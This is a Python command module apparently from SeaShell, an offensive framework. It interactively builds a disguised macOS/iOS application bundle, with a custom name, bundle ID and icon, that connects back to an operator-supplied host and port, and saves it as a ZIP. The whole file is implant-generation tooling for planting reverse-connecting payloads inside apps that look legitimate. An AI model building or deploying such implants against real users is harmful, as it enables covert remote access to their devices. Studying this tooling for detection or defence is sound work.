"""
This command requires SeaShell: https://github.com/EntySec/SeaShell
Current source: https://github.com/EntySec/SeaShell
"""

from seashell.core.app import App

from pex.proto.tcp import TCPTools

from badges.cmd import Command


class ExternalCommand(Command):
    def __init__(self):
        super().__init__({
            'Category': "manage",
            'Name': "app",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - command developer'
            ],
            'Description': "Build APP file and save as ZIP.",
            'MinArgs': 1,
            'Options': [
                (
                    ('-b', '--build'),
                    {
                        'help': 'Build new IPA file.',
                        'action': 'store_true'
                    }
                )
            ]
        })

    def rpc(self, *args):
        if len(args) < 4:
            return

        elif args[0] == 'build':
            app = App(args[2], args[3])
            app.generate(args[1])

    def run(self, args):
        local_host = TCPTools.get_local_host()

        if args.build:
            name = self.input_arrow("Application name (Mussel): ")
            bundle_id = self.input_arrow("Bundle ID (com.entysec.mussel): ")

            icon = self.input_question("Add custom icon set (.icns) [y/N]: ")
            icon_path = None

            if icon.lower() in ['y', 'yes']:
                icon_path = self.input_arrow("Icon set file path (.icns): ")

            host = self.input_arrow(f"Host to connect back ({local_host}): ")
            host = host or local_host

            port = self.input_arrow("Port to connect back (8888): ")
            port = port or 8888

            path = self.input_arrow("Path to save the APP as zip: ")

            app = App(host, port)
            app.set_name(name, bundle_id)

            if icon_path:
                app.set_icon(icon_path)

            self.print_success(f"APP saved to {app.generate(path)}!")
